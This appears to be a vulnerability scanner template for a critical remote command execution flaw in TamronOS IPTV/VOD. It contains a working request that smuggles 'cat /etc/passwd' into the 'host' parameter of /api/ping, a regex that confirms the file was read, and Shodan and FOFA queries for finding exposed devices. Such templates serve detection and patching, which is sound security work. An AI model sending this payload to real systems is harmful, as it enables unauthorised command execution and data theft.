id: tamronos-rce
info:
  name: TamronOS IPTV/VOD - Remote Command Execution
  author: pikpikcu
  severity: critical
  description: A vulnerability named tamronos-rce allows remote command execution
    in TamronOS IPTV/VOD through the exploitation of the 'host' parameter of the /api/ping
    endpoint.
  reference:
  - https://twitter.com/sec715/status/1405336456923471874
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-78
  metadata:
    verified: true
    shodan-query: "title:\"TamronOS IPTV\u7CFB\u7EDF\""
    fofa-query: "title=\"TamronOS IPTV\u7CFB\u7EDF\""
    impact: The impact of the tamronos-rce vulnerability in TamronOS IPTV/VOD is the
      potential for unauthorized parties to execute remote commands through the 'host'
      parameter of the /api/ping endpoint.
    recommendation: I highly recommend immediately addressing the remote command execution
      vulnerability in TamronOS IPTV/VOD's 'host' parameter of the /api/ping endpoint
      by implementing appropriate security measures to prevent malicious attacks.
  tags: tamronos,rce
requests:
- method: GET
  path:
  - '{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp'
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
